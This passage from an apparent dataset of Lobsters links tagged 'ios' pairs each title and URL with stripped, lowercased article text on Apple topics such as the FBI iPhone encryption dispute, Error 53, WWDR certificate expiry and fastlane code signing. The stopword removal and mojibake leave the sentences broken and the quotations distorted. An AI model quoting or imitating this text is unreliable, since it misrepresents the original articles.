trying match classic mac o apple better understanding wanted navigation finder element ui still comically oversized finder evidence transition carbon side revisit mail see appkitcocoa faring o release mail mail saw earlier piece look different indeed still betrays next root iconography preference window clearly look similar carbonbased finder see environment starting come together something new shared design language mac o x shipped consumer refined massively first implementation aqua mail mac o x appkit finder mac o x carbon taken apple four year find new maclike template mac o x followed ever since eighteen year later element mac o x ui still recognizable today much think mac experience today came nextstep mac o appkit toolbars service tooltips multicolumn table view font color picker idea dock application bundle installer package home folder multiple user might even hardpressed find carbon app application folder today apple announced wo nt even run next version macos apple got chance complete doover mac o x modern architecture optimized touchscreen device powerful gpus thermal resource battery constraint doover course iphone o instead appkit come way nextstep refactored rebuilt openstep powered first decade mac o x apple apple decided build something fresh everything learned uikit technology progressed uikit device power become complex powerful macos uikit finally coming back mac serve toptier native application development framework alongside appkit start apple next transition like last time almost unfathomably difficult see two completely different architecture cooperate find common ground like last time start baby step uikit adopting metric style macos appkit adopting interaction io two side growing closer time sharing dna like last time road ahead much longer see perspective building towards come next even nt yet know really interesting question probably wo nt answer year come whether uikit carbon cocoa transition think appropriate answer yes uikit present developer ecosystem bring incredibly important appkit also present provides power mac know sure great genredefining apps uikit appkit mac carbon itunes photoshop microsoft office final cut pro eighteen year carbon finally reaching end date transition apps cocoaappkit complete appkit still eighteen year left ahead think mac fine classic mac o nextstep came end mac think everybody agree unified whole much greater sum part clear future still written mac developer io developer alike get help shape need cowbell older
397,Lobsters,ios,Apple iOS,U.S. files motion to force Apple to obey iPhone order,http://www.reuters.com/article/us-apple-encryption-doj-idUSKCN0VS2FT,u file motion force apple obey iphone order,aaplo id change pose hurdle,washington reuters u department justice filed motion friday seeking compel apple inc aaplo comply judge order unlock encrypted iphone belonging one san bernardino shooter portraying tech giant refusal marketing strategy apple logo hang entrance apple store avenue manhattan borough new york city july reutersmike segarin response senior apple executive speaking reporter condition anonymity characterized justice department filing effort argue case medium company chance respond back forth escalated showdown obama administration silicon valley security privacy ignited earlier week federal bureau investigation seeking tech company help access shooter syed rizwan farook phone disabling passcode protection company far pushed back thursday three extra day respond order another senior apple executive said congress right place debate encryption courtroom executive said apple stunned legal request come u government rather country weaker tradition protecting privacy civil liberty motion compel apple comply carry specific penalty company justice department declined comment recourse willing seek order prosecutor acknowledged latest filing legally necessary since apple yet responded initial order clash apple justice department driven straight heart longrunning debate much law enforcement intelligence official able monitor digital communication federal court hearing california scheduled march case according thom mrozek spokesman u attorney office central district california justice department said friday motion response apple ceo tim cook public statement wednesday included refusal hack user undermine decade security advancement protect customer rather assist effort fully investigate deadly terrorist attack apple responded publicly repudiating order prosecutor wrote friday filing apple current refusal comply court order despite technical feasibility instead appears based concern business model public brand marketing strategy prosecutor said id change pose hurdle two senior apple executive said company worked hard help investigator tried multiple avenue including sending engineer fbi agent wifi network would recognize phone begin automatic backup enabled criticized government official reset apple identification associated phone closed possibility recovering information automatic cloud backup san bernardino county reset password icloud account request fbi said county spokesman david wert government first disclosed identification change footnote filing friday apple executive said reset occurred apple consulted justice department declined comment contention two side collision course since apple said would offer strong encryption default device move prompted part surveillance revelation former national security agency contractor edward snowden justice department struggled find compelling case encryption proved insurmountable hurdle investigator dec shooting rampage farook wife san bernardino california killed authority believe couple inspired islamic state technology expert privacy advocate backing apple suggest farook work phone likely contains little data value accused justice department choreographing case achieve broader goal gaining support legislation legal precedent would force company crack encryption investigator case quickly become topic u presidential race republican frontrunner donald trump friday called boycott apple company complied court order two apple executive said felt good company noting trump faulted many group individual debate also play capitol hill bipartisan leader u house energy commerce committee late friday invited apple cook fbi director james comey testify upcoming hearing encryption though date set house judiciary committee also planning encryption hearing march invited apple attend according congressional source version story corrected remove reference google encryption paragraph reporting julia edward dustin volz additional reporting lisa richwine los angeles david ingram washington dan levine julia love joseph menn san francisco editing bill rigby cynthia osterman lisa shumaker
398,Lobsters,ios,Apple iOS,A Message to Our Customers,http://www.apple.com/customer-letter/,message customer,threat data security,threat data security would argue building backdoor one iphone simple cleancut solution ignores basic digital security significance government demanding case today digital world key encrypted system piece information unlocks data secure protection around information known way bypass code revealed encryption defeated anyone knowledge government suggests tool could used one phone simply true created technique could used number device physical world would equivalent master key capable opening hundred million lock restaurant bank store home reasonable person would find acceptable government asking apple hack user undermine decade security advancement protect customer including ten million american citizen sophisticated hacker cybercriminals engineer built strong encryption iphone protect user would ironically ordered weaken protection make user le safe find precedent american company forced expose customer greater risk attack year cryptologist national security expert warning weakening encryption would hurt wellmeaning lawabiding citizen rely company like apple protect data criminal bad actor still encrypt using tool readily available
401,Lobsters,ios,Apple iOS,‚ÄòError 53‚Äô fury mounts as Apple software update threatens to kill your iPhone 6,http://www.theguardian.com/money/2016/feb/05/error-53-apple-iphone-software-update-handset-worthless-third-party-repair,error fury mount apple software update threatens kill iphone,iphone io apple posting message apple support community forum apple charge repair home button iphone uk ifixit website article tech writer mike wehner article tech writer reuben esparza,thousand iphone user claim left holding almost worthless phone apple latest operating system permanently disables handset detects repair carried nonapple technician relatively people outside tech world aware socalled error problem happens know according one specialist journalist kill iphone issue appears affect handset home button touch id fingerprint recognition builtin repaired nonofficial company individual also reportedly affected customer whose phone damaged able carry using without need repair problem come light latest version apple iphone software io installed indeed phone may working perfectly week month since repair damaged installation growing number people watched horror phone may well cost rendered useless photo data held handset lost irretrievable tech expert claim apple know problem done nothing warn user phone bricked ie rendered technologically useful brick install io upgrade choice journalist antonio olmos dropped iphone covering refugee crisis use local repair shop freelance photographer selfconfessed apple addict antonio olmos say happened phone week ago upgraded software olmos previously handset repaired assignment guardian macedonia balkan covering refugee crisis september dropped phone desperately needed work got fixed local shop apple store macedonia repaired screen home button worked perfectly say thought sent standard notification apple inviting install latest software accepted upgrade within second phone displaying error effect dead olmos say spent thousand pound apple product year took apple store london staff told nothing could phone junk pay replacement furious whole thing extraordinary company deliberately make product useless upgrade warn customer outside big industrialised nation apple store far damaged phone brought back life small thirdparty repairer even sure thirdparty outfit even know potential problem say olmos far one affected google iphone error find shortage people reporting left phone function expensive paperweight posting message apple support community forum december arjunthebuster typical heshe say bought iphone january dubai dropped following month causing small amount damage carried using phone tried install io november error popped error occurred broke phone working fine month lost data error want apple fix screen anything want fix error use phone could apple move appears designed squeeze independent repairer contravene competition rule car manufacturer example allowed insist buyer get car serviced apple charge repair home button iphone uk independent repairer would demand fraction californiabased tech expert kyle wiens run ifixit website say major issue error page website hit suggesting big problem apple user told guardian money problem occurs repairer change home button cable following software upgrade phone effect check make sure still using original component simply lock phone warning way know bring back life say unclear whether deliberate move force anyone drop phone use apple repair along apple view want third party carrying repair product look like obvious extension say allow customer recalibrate phone repair huge outcry problem something daily dot website feature article tech writer mike wehner headlined error kill iphone one know relates iphone plus left effectively dead world meanwhile article tech writer reuben esparza published november icracked phone repair service state pressed information error apple employee could offer explanation part would replace software fix way access phone memory fix new iphone continues though still largely mystery know error result hardware failure somewhere within home button assembly spokeswoman apple told money get ready jargon overload protect fingerprint data using secure enclave uniquely paired touch id sensor iphone serviced authorised apple service provider apple retail store change affect touch id sensor pairing revalidated check ensures device io feature related touch id remain secure without unique pairing malicious touch id sensor could substituted thereby gaining access secure enclave io detects pairing fails touch id including apple pay disabled device remains secure add iphone serviced unauthorised repair provider faulty screen invalid component affect touch id sensor could cause check fail pairing validated subsequent update restore additional security check result error displayed customer encounter unrecoverable error recommend contacting apple support
402,Lobsters,ios,Apple iOS,Apple‚Äôs apps need work,http://www.theverge.com/2016/2/3/10900612/walt-mossberg-apple-iphone-ios-mac-osx-app-problems,apple apps need work,best smartphone market overall work itunes desktop made better mail billion people photo much faster cleaner icloud,people think apple maker excellent premium hardware fact many reviewer regard apple device best buy instance record saying important product iphone best smartphone market verge overallbut metal glass silicon product apple builtin software huge part experience since company introduced first mac whether operating system core apps major aspect make user reviewer value apple product software meld power reliability ease use work favorite steve job phrasein last couple year however noticed gradual degradation quality reliability apple core apps mobile io operating system mac o x platform almost tech giant taken eye ball come core software product pursues big new dream like smartwatches carslet clear time scenario find core apple apps work well enough sometimes delightfully well otherwise recommend hardware love imessage new note apple pay touch id safari airplay though core apps made competitor generally fabulousbut exception increasing hold apple higher oftenproclaimed standard based work claim oftrepeated contention mr job successor tim cook apple business make great product apple advantage design build software together software nt excellent superlative hardware disservice welcome mossberg weekly commentary review column verge recode veteran tech journalist walt mossberg executive editor verge editor large recode response inquiry apple said dedicated software team across multiple platform effort strong ever company explains team work every major core app year hardware year see major revamps apps others apple apps often fail meet selfimposed standard apple course famous software misfire like mobileme itunes ping cloud service first iteration apple map gotten vastly better far apple news nothing write home view talking familiar mainstay like mail photo itunes icloud way big sometimes small nagging think often fail meet apple selfimposed standard sometimes io sometimes o x sometimes example itunes desktop apple itunes program envy world combined digital music store player could also sync ipod worked mac window reasonably fast surefooted dread opening thing despite big overhaul made better itunes bloated complex sluggish gotten even worse since recent integration new apple music streaming service day tried sync two ipads rare event took forever program recognize three mac built itunes slow almost every task time disassemble thing way apple done io itunes store content type music video podcasts playback app company concedes debated question far come side keeping huge program one piece working make faster wring bug occur mail apple desktop mobile mail apps superb despite nice feature addition find become slow unreliable especially true use gmail billion people experience platform mail slow receiving sending gmail message whether personal business account message show search miss thing problem go beyond gmail like many others know rely gmail forced switch least add google gmail app website apple claim issue beyond control control email app vendor gmail us nonstandard technology give speed advantage search giant apps site google told otherwise past problem go beyond gmail find lot io new o x email apps try help quick message triage intelligently autosort various type email apple ventured territory beyond enabling swiping action dealing message even junk mail filter far superior competitor failing regularly day mobile version mail still send mail contact group make apple contact app company say deliberate group iphone meant use mail photo photo got big upgrade mac last year apple finally retired aging creaky iphoto replaced app called photo new app much faster cleaner experience mac accompanying optional service called icloud photo library store image cloud tarnish improved experience work quickly accurately iphone ipads slow balky desktop one people picture still take forever mac find older photo show blank thumbnail apple quality worse apple brilliant builtin photo feature shared icloud library personal private social network built around related photo always sync properly io mac company say common occurrence icloud still lot work done cloud brings may apple annoying consequential software weakness cloud software thing apple ecosystem like contact imessages sync great experience addition photo example find music apple streaming music sometimes wrong album art fetched icloud safari bookmark sync intermittently across apple device unlike amazon kindle app apple product company ibooks remember left unless set bookmark trying edit collaboratively comment cloud version apple page word processor much harder google doc lately even cloud backup io failed ipads one able back cloud five week sync itunes company proud ability make thing work across device continuity handoff feature let answer voice call mac continue task started desktop phone attribute least complaint like ipad backup issue bug particular setup maybe larger pattern cloud issue besides supposed work none thing insurmountable perhaps apple right bug get quashed observing due setup convinced something broader going lot small software disappointment aggravation adding gradually time putting sterling experience using apple hardware risk
403,Lobsters,ios,Apple iOS,The fight for a third-best smartphone OS has been lost. By everyone.,http://arstechnica.com/gadgets/2016/02/the-fight-for-a-third-best-smartphone-os-has-been-lost-by-everyone/,fight thirdbest smartphone o lost everyone,enlarge strongly implied notentirelyawful blackberry priv taken big yearoveryear tumble wait software update seems like never come first version window phone take sweet time port selling window phone store still getting bad press fire phone firefox o phone dead sailfish o ubuntu tizen,enlarge watching smartphone operating system burn fade away last year two badandrew cunningham day ago blackberry ceo john chen strongly implied android future company say blackberry finished future phone company much likely resemble notentirelyawful blackberry priv last week microsoft announced lumia sale taken big yearoveryear tumble last year company busy getting software onto competing platform window phone loyalist wait software update seems like never come two platform best hope solid thirdplace mobile operating system fallback option people unsatisfied android io point clear race third place somebody everybody lost blackberry perhaps doomed start first version came three year ago well apple google even microsoft established modern smartphone platform clear blackberry failure decision market made blackberry decision pivot googlepowered android focus service good evidence decline fall window phone tragic several year o making headway app problem sure window phone brought o level io android lowend lumias provided excellent value money soon buying lumia division nokia microsoft seemed stop pushing window phone left rot microsoft take sweet time finishing continually delayed window update existing window phone user sit watch microsoft port every selling point window phone platform io android embracing io android unquestionably give microsoft apps service wider audience reason done expense company existing user base remains platform really viable generalpurpose smartphone ecosystem diehard disagree microsoft least given window phone acolyte gift form lumia recommending smartphone someone android io pretty much anything anyone need able window phone blackberry best left people care brand loyalty functionality neither apple google control mobile market completely microsoft controlled pc market year ago like competition exist still feel like hole market one tightly controlled sterility io android fractured mess lot way window phone window mobile since microsoft make mind could fill gap available multiple oems use hardware updated microsoft directly instead relying company little incentive support handset selling recognizable visual arguably ahead consistent phone phone run well lowend hardware handle nichebutimportant thing like external storage device well live tile implemented well ably split difference iosstyle app icon android widget microsoft one company enough money push moneylosing platform enough time establish window mobile least undergoing visible active development unlike many peer nt look like enough make difference end window still small hope rising tide window desktop lift mobile version boat developer create universal window store apps desktop able adapt phone screen little effort success window necessarily translate window store apps store still getting bad press even though response window mostly positive overall window mobile fading essentially hope thirdparty operating system ever gain critical mass user would need compete io android writing wall blackberry fire phone colossal flop firefox o phone dead sailfish o ubuntu tizen going anywhere forked nongoogle version android control significant chunk worldwide market share ecosystem even fractured googlesupported android platform good idea good idea may may show io android continue evolve lack strong third pillar mobile something strong linux o really exist closedoff lockeddown smartphone world like comparatively standardized open world pc bad everyone
404,Lobsters,ios,Apple iOS,"Apple recalls some AC adapters, world travel kits in parts of South America, Europe, Asia, and Oceania",http://appleinsider.com/articles/16/01/28/apple-recalls-some-ac-adapters-world-travel-kits-in-parts-of-south-america-europe-asia-and-oceania,apple recall ac adapter world travel kit part south america europe asia oceania,recalled,apple thursday issued recall twopronged ac wall plug adapter designed argentina australia brazil continental europe new zealand south korea potential risk electric shock apple said aware incident around world twopronged ac wall plug adapter broke resulted electrical shock user touched recall includes many twopronged wall plug shipped mac io device determine wall plug affected recall check inside slot attache main apple power adapter affected wall plug either four character five character character printed inside slot apple first recall since august recalled number thirdgeneration apple tv unit defective part
405,Lobsters,ios,Apple iOS,"At 83, I Decided to Develop an App",https://medium.com/@DonRumsfeld/at-83-i-decided-to-develop-an-app-dadd4e53d342,decided develop app,,among thing one learns time pass everyone age everyone get old one best way stay young keep learningthat one reason spent better part past two year trying hand developing mobile app precise working team developer bring digital age card game date back least second world war perhaps earlier starting week pleased going new life thanks modern technologymy involvement game incredibly devilish version solitaire start one greatest leader century one tumultuous time world history storyon may nazi tank overran belgium hitler invasion western europe number consequence one man named winston churchill become prime minister day predecessor neville chamberlain resigned humiliation another consequence force exile young belgian government aide named andr√© de staercke plotted turn back fascist tide de staercke came know churchill incomprehensible stress luftwaffe nightly bombing raid london america reluctant dragged another world war entire world looked firewinston churchill midsixties opinionated forceful determined ever ready colorful quip young photographer told hoped able shoot churchill picture prime minister birthday churchill immediately replied see young man look reasonably fit healthy churchill appreciated many thing good book bottle scotch cigar game kind perhaps else keen mind found last quality young andr√© de staercke late twenty became something prot√©g√© churchillandr√© de staercke joyce rumsfeld c doubt prime minister churchill taught andr√© number thing one thing know sure churchill taught play uniquely challenging game solitaire know met andr√© de staercke thirty year later president richard nixon nominated serve u ambassador north atlantic treaty organization nato de staercke esteemed senior belgian diplomat nato headquarters brussels taught churchill game mei remember de staercke sitting across plane somewhere europe playing curious game dizzying column miniature card arrayed table u asked playing proceeded tell origin game called churchill solitaire man much admired diabolical rule make hardest game solitaire probably challenging strategic game logic puzzle ever playedmost people played version solitaire life churchill version like man far demanding complex instead using single deck card churchill solitaire us two deck instead traditional row card instead simply moving card fit back singlesuited pile ace king churchill solitaire includes extra row six card devil six player liberate wellchurchill solitaire game everyone take patience perseverance cunning concentration strategy sacrificeit card game frustrate even skilled player single move make break entire game number hand simply unwinnable steadfast player gamely soldier find way victoryas friend andre de staercke put one need life pessimism intelligence optimism play couple hand churchill solitaire know precisely meantover ensuing four decade played game two miniature deck card across wide table much way envision churchill playing except without cigar red label long flight across world found quiet moment end busy day would clear mind refocus playing hand game found help improve concentration sharpens instinct succeed churchill solitaire envision variety scenario think good many move aheadup year ago probably dozen people entire world knew play game mostly people taught game wife joyce second best living churchill solitaire player know child assorted colleague friend winston churchill gone andr√© de staercke well knew around forever every chance game churchill enjoyed could lost agesthen approached turning game app say much idea app even played regular version solitaire ipad turning churchill solitaire app something ever envisioned something sure churchill family would even want u contemplatein january wrote letter sir winston churchill greatgrandson mr randolph churchill known randolph father day diplomat told randolph background game interest calling churchill solitaire wondered churchill family would objectionto contrary churchill family enthusiastic idea randolph called marvelous way bring back life agreed lend name well profitmaking endeavor either part churchill family profit game like mine go charity
407,Lobsters,ios,Apple iOS,F.lux Responds to Apple's Announcement of Night Shift,https://justgetflux.com/news/2016/01/14/apple.html,flux responds apple announcement night shift,people asked reference cancer claim brief list ama health implication light night exposure light night drive intrinsic resistance tamoxifen therapy breast cancer better sleep predicts longer survival time woman advanced breast cancer higher level melatonin hormone involved sleepwake cycle may suggest decreased risk developing advanced prostate cancer,apple announced week joined fight use technology improve sleep lot done indeed worker nearly double lifetime risk cancer much believed driven exposure bright light wrong time involvement fixing problem big commitment important first step proud original innovator leader area continued work last seven year learned complicated people actually next phase flux something wait ship world rather suggest simple answer mission enable flux advance science providing customized solution person intend make flux better every way app designed back today call apple allow u release flux io open access feature announced week support goal furthering research sleep chronobiology continue innovate improve upon idea remain hopeful opportunity offer best new work everyone want learned life biology everyday routine incredibly wonderfully different difference must embraced one right answer everyone committed making software ever adaptive responsive need thank word support hope join u quest understand screen light affect sleep turn human health love michael lorna people asked reference cancer claim brief list ama health implication light night exposure light night drive intrinsic resistance tamoxifen therapy breast cancer better sleep predicts longer survival time woman advanced breast cancer higher level melatonin hormone involved sleepwake cycle may suggest decreased risk developing advanced prostate cancer
409,Lobsters,ios,Apple iOS,Keyboard Sm√∂rg√•sbord,http://www.elischiff.com/blog/2015/9/29/keyboards-smorgasbord,keyboard sm√∂rg√•sbord,skeuomorphism tactility art lebedev,character preview instrumental usability iphone keyboard since one thumb inevitably cover key typed feedback le necessary ipad since larger tap target despite interest minimalism apple introduced show character preview setting disabled default beta io default since reversed argue setting disabling character preview added inputting sensitive somewhat plausible rationale nevertheless setting nt buried deep setting readily available keyboard skeuomorphism tactility one half century keyboard typewriter computer terminal set precedent allcaps keyboard dynamically changing graphic course impossible given rigid construction earlier keyboard art lebedev notwithstanding making transition screenbased keyboard afforded opportunity trade onetoone referential accuracy medium ability extend metaphor reason argue caseshifting keyboard deserves transition period much powerful extension keyboard metaphor reason character preview powerful design innovation
410,Lobsters,ios,Apple iOS,Apple WWDR Intermediate Certificate Expiration,https://developer.apple.com/support/certificates/expiration/index.html,apple wwdr intermediate certificate expiration,apple worldwide developer relation intermediate certificate expiration renewed certificate receipt validation programming guide need take action renewed certificate apple wallet pass mac apps safari extension o x el capitan safari push notification app store submission known issue xcode unable create distribution build app store submission enterprise apps renewed certificate o x el capitan mac app store purchase failing launch renewed certificate safari extension builder unable locate safari extension signing certificate o x el capitan safari o x yosemite maverick need regenerate certificate need recompile resubmit apps pass safari extension customer affected certificate renewal apps development continue working inhouse enterprise io apps continue working renewed certificate expire,apple worldwide developer relation intermediate certificate expiration help protect customer developer require third party apps pass apple wallet safari extension safari push notification app store purchase receipt signed trusted certificate authority apple worldwide developer relation certificate authority issue certificate use sign software apple device allowing system confirm software delivered user intended modified previous apple worldwide developer relation certification intermediate certificate expired february renewed certificate must used signing apple wallet pass push package safari push notification safari extension submission app store mac app store app store apple tv developer download install renewed certificate development system server apps remain available app store io mac apple tv since different method used validating receipt delivering remote notification recommend test service ensure implementationspecific issue exist apps may experience receipt verification failure receipt checking code make incorrect assumption certificate make sure code adheres receipt validation programming guide resolve receipt validation issue need take action developer provide pass apple wallet deliver safari push notification create safari extension submit apps app store mac app store app store apple tv need download renewed certificate take following action apple wallet pass update pas signing server replace expired certificate renewed certificate february date apps generate pass apple wallet able install new pass server updated mac apps verify receipt validation code compatible renewed certificate test production environment mac app store update o x snow leopard available via o x software update safari extension install renewed certificate build extension february certificate available safari extension builder update signing system o x el capitan order build update extension existing safari extension continue run expected safari push notification update notification package signing server include web push certificate renewed intermediate certificate february date new user able sign push notification website server updated using function sign push package web push certificate pas path renewed intermediate extra certificate parameter app store submission submission app store mac app store app store apple tv february must utilize renewed certificate new app submission compiled expired intermediate returned developer known issue xcode unable create distribution build app store submission enterprise apps issue occurs expired wwdr intermediate certificate present system keychain login keychain within keychain access application resolve issue first download install renewed certificate next keychain access application select system keychain select show expired certificate view menu delete expired version apple worldwide developer relation certificate authority intermediate certificate certificate appear valid keychain access available xcode issue resolved o x el capitan mac app store purchase failing launch scenario app purchased mac app store utilizes receipt validation may fail launch exiting error code since considers local receipt includes expired wwdr intermediate certificate invalid macos regard receipt valid updated wwdr intermediate present system therefore request updated receipt application resolve issue delete renewed nonexpired wwdr intermediate certificate system andor login keychain within keychain access application relaunching application prompted mac app store login credential order obtain new receipt application launched application obtained valid receipt reinstall renewed certificate continue development issue fixed forthcoming update o x el capitan safari extension builder unable locate safari extension signing certificate building update extension safari extension builder safari earlier encounter issue safari extension builder fails recognize safari extension signing certificate certificate available safari extension builder update signing system o x el capitan install safari o x yosemite maverick order build update extension need regenerate certificate existing certificate work expiring renewed intermediate certificate need recompile resubmit apps pass safari extension need recompile resubmit currently deployed apps pass safari extension continue run expected keep mind submission app store update pass extension made february must use renewed certificate customer affected certificate renewal customer purchased installed io apps tvos apps safari extension affected certificate renewal user running o x el capitan may receive notification mac app damaged utilizes receipt validation request new receipt apple resolve issue restarting mac updating o x el capitan later mac app store customer running o x snow leopard unable purchase new apps run previously purchased apps utilize receipt validation install mac app store update o x snow leopard available via o x software update apps development continue working yes development version apps continue run provisioning profile used compile expires revoke signing certificate inhouse enterprise io apps continue working yes inhouse enterprise io apps deployed continue run expected provisioning profile used compile expires revoke signing certificate renewed certificate expire renewed apple worldwide developer relation certification intermediate certificate expire february
411,Lobsters,ios,Apple iOS,Why Spinlocks Are Bad On iOS,http://engineering.postmates.com/Spinlocks-Considered-Harmful-On-iOS/,spinlocks bad io,,
412,Lobsters,ios,Apple iOS,Did Apple just give up?,https://medium.com/@se4nn/wtf-happened-at-apple-4a27e55c3c31,apple give,cowrote article fastcompany,io released september almost year jony ive assigned headingup user interface design division apple spending year working solely interface appointment hopeful man along steve job many considered pulled apple fire threw back spotlight led team designed ipod imac iphone man head user interface experience team surely good move came widely criticised designer people started hate apple error ironed still leaf feeling little wanting use interfacea week back two well respected exapple designer norman bruce tognazzini cowrote article fastcompany explaining thought apple giving design bad name described frustration apple known designing easytouse easytounderstand product champion graphical user interface started destroy design pretty strong word right entering define destroy google give end existence something damaging attacking definition norman tognazzini claim destruction design really started apple started neglect principle design principally happened introduction iphone ipad iphone started use gestural based interface back button swipe lead user taking learn whilst apple product considered beautifully designed piece hardware take new macbook example insistence removing deem unnecessary ultimately damaging user experience leading blame shortcoming device think stupid apple emphasis making thing minimal unobtrusive actually opposite effect instead increasing beauty simplicity product instead leading people search way around thing norman tognazzini talk woman met complained use accessibility option increase font size device able read whilst ok system interface complained many app screen option made normal font large text fit screen apple product deliberately hide complexity obscuring even removing important control continuing article norman tognazzini make poignant observation apple product deliberately hide complexity obscuring even removing important control read article aware referencing lack one button face iphone singular home button ubiquitous iphone home screen since launch far button placed however android went different path choosing switch three onscreen device button across wide range devicesnow know lot reading may baulk idea android better implementation io bear three button accessible base android device put simple important user interaction front centre device may beautiful method certainly easiest use double tapping home button switch apps moving top left corner quickly tap back screen everything need within thumb reachi chance play around newest apple tv sure agree shockingly bad amount feature missing mean amazon fire tv stick work better easier use earth would want spend buy one firstly keyboard nightmare make mistake sure swipe way across backspace key right screen clicking trying move back key actually wanted know onscreen keyboard especially tv always nightmare apple one major advantage competitor team make iphone surely could connect iphone tv type nope sorry however use iphone setup tv entirely sure use keyboard digressalso remote control nightmare use one thing menu button generally used back button apps oh also activate menu surely user experience nightmare something would expect company apple supposed design credentialsas see image uiblur used apple tv along ubiquitous ui kit apple answer bootstrap foundation native apps however tvos brandspankingnew lot app developer content creator making apps entirely interface leading bland ugly looking native tvos apps people leading field game developer know apple wanted open software many developer could take look biggest content publisher pushing application like espn example underwhelmed apps look feel also ordinary everything new platform feel threatened uniformity almost enforced appleespn tvos app
413,Lobsters,ios,Apple iOS,Apple iPhone Prototypes Revealed During Samsung Lawsuit,http://bgr.com/2015/12/07/apple-secrets-iphone-ipad-samsung-lawsuit/,apple iphone prototype revealed samsung lawsuit,agreed pay apple samsung apple miss sorry fallout witcher game year close crazy iphone prototype iphone project started early ipad prototype featured kickstand apple wanted original iphone curved apple tossed around idea car year ago apple car might look like apple keep io source code locked apple hated samsung next big thing already ad campaign apple conduct market research iphone demand every month steve job viewed iphone v android battle holy war apple product roadmap well thought advance apple kicking around idea tv subscription iphone buyer use case,following contentious patent battle raged nearly five year samsung last week finally agreed pay apple million damage infringing upon number iphone ipad patent samsung may still holding hope may someday recover million seems finally start closing book widely publicized patent dispute recent memory one saw apple samsung battle courtroom across corner globe miss sorry fallout witcher game year close one interesting aspect apple legal battle samsung gave u unprecedented look behind veil secrecy typically shroud aspect apple product development daytoday operation course discovery innumerable court filing fascinating trial inner working apple brought forefront first time history photograph iphone prototype apple conduct market research apple legal battle samsung provided tech enthusiast treasure trove previously topsecret information samsung agreeing pony damage thought good time take step back reminisce take look interesting nugget information hardfought patent dispute brought light crazy iphone prototype without question one intriguing item emerge apple samsung trial number iphone prototype never ended seeing light day brief selection interesting design seen iphone prototype side interesting downright bizarre design good measure thankfully apple never opted black white design one earliest known iphone prototype notice o us circular dot indication signal strength rather vertical bar apple would eventually implement five circular dot shipping iphone jony ive granted full control look feel io also tell extremely early iphone prototype based icon used many simply copy o x counterpart another point interest note home button menu label glad apple never fully pursued prototype design lastly bulky iphone prototype look like might inspired iphone design iphone project started build throughout trial apple executive provided u incredibly detailed information surrounding early day iphone development interesting tidbit emerge include following early beginning software control iphone team given scott forstall steve job giving forstall free rein hire anyone division within company team job also told forstall hire anyone outside company pitching project prospective team member forstall even tell working rather forstall cryptically told opted join would work hard give night work weekend year mincing word forstall also told prospective team member choose accept role work harder ever entire life initial development iphone referred project purple took place separate building forstall likened dorm people time smelled like pizza forstall said security airtight building iphone development taking place replete video camera card reader testifying forstall said worker team would show badge five six time able access key development area original iphone team put fight club poster wall well first rule project purple talk project purple forstall said amount work went creating original io interface monumental devoted year life doubletap zoom feature dreamt forstall grew weary constantly enacting pinchtozoom reading text webpage though likely larger size apple iphone team strong software aside trial also gave u unprecedented look industrial design team tasked housing apple software innovative sleek hardware testifying trial long time apple industrial designer christopher stringer relayed number interesting nugget information hardware industrial design apple industrial design group time iphone development consisted maniacal individual share one singular purpose imagine product exist guide life apple industrial design group collaborates closely often exchange sketch idea current upcoming product around single table feedback suggested design stringer explained often brutally honest iterative process extensive instance single design element result proposed mockups apple industrial design group work closely technical liaison provide designer extensive feedback regarding various design affect issue durability droptesting early ipad prototype featured kickstand though microsoft surface actually feature kickstand apple coming earliest ipad prototype also experimented idea incorporating kickstand device apple wanted original iphone curved trial stringer also revealed original idea first iphone release device featuring two curved piece glass idea ultimately abandoned however technology needed cut glass apple specification expensive time scale still prototype curved device built seen apple tossed around idea car year ago stand apple executive phil schiller said company open anything brainstorming product idea build success ipod searching ipod would make sense schiller said make ipod else idea tossed around included dedicated camera car assortment crazy stuff interestingly enough former apple executive tony fadell relayed week ago job back talked apple car might look like apple keep io source code locked ahead apple samsung trial apple henri lamiraux key vp io engineering retired submitted following declaration court effort keep portion apple io source code sealed apple source code provided highest level protection security within apple physical access io source code limited select group authorized apple employee access provided portion cod needtoknow basis access limited employee directly involved software development management security employee access must approved management authorized employee account must specifically granted access apple hated samsung next big thing already ad campaign samsung string welldone ad lampooning stereotypical apple fan private email made public trial apple phil schiller hated apple adequate response samsung jab event went far suggest tim cook company needed hire brand new ad agency wake samsung ad aired schiller sent following email one ad contact tbwachiatday pretty good cant help think guy feeling like athlete miss zone struggle nail compelling brief drastic change fast note one prominent antiapple samsung ad seen look closely even see brief cameo silicon valley character nelson big head bighetti video apple conduct market research iphone demand every month steve job may famously declared apple market research exactly case course apple samsung trial apple vp iphone io product marketing greg joswiak said apple survey user month across multiple country survey reveal joswiak explained countrybycountry driving customer buy apple iphone product versus product android product samsung sell feature use customer demographic level satisfaction different aspect iphone case apple aware iphone preference vary exacting detail across individual country also interesting market research kept closely guarded often circulates within small group apple executive iphonerelated survey ipadrelated survey allowed distributed anyone outside group without personal express permission regularly refuse joswiak added approve distribution almost always survey questionbysurvey question basis even distribution limited individual demonstrated need know steve job viewed iphone v android battle holy war perhaps terribly surprising given job famous threat go thermonuclear google october email steve job referenced holy war google notably email sent month apple sued samsung apple product roadmap well thought advance another portion steve job email reveals apple back october already planning lte support talking iphone hardware nearly full two year would actually launch also see job reference releasing ipad stay ahead competitor apple kicking around idea tv subscription job email interesting tidbit iphone buyer use case apple survey revealed upwards iphone user buy case device life long mac user apple enthusiast yoni heisler writing apple tech industry large year writing appeared edible apple network world maclife macworld uk recently tuaw writing analyzing latest happening apple yoni enjoys catching improv show chicago playing soccer cultivating new tv show addiction recent example walking dead broad city
414,Lobsters,ios,Apple iOS,"Use new fastlane tool ""match"" to fix code-signing problems",https://codesigning.guide/,use new fastlane tool match fix codesigning problem,new approach code signing best practice guide manage certificate provisioning profile development team apple doc solution keep key insync git one code signing identity expand,new approach code signing best practice guide manage certificate provisioning profile development team wait code signing code signing required io distributing app customer assures app trusted modified since last signed see apple doc general detail code signing solution keep key insync git central place code signing identity profile kept anyone access build process way entire team use account one code signing identity without manual work confusion instead registering yet another service use separate private git repo sync profile across multiple machine use git code signing basic requirement one code signing identity shared across team easiest way create new apple id team eg iosdev companycom use get started first create new private git repo store profile next create new private key certificate environment distribution development store private key certificate git repo create new provisioning profile various target development app store ad hoc matching certificate store git repo committing file git recommended encrypt file eg using openssl machine access git repo install latest certificate provisioning profile certificate private key imported keychain either using finder using security import command provisioning profile copied librarymobiledeviceprovisioning profile xcode project must configured choose provisioning profile automatically define statically ideal solution pas uuid provisioning profile via environment variable bundle identifier future add new device ad hoc development provisioning profile update profile git repo thing consider make sure provisioning profile created using correct certificate app multiple target eg today widget repeat target 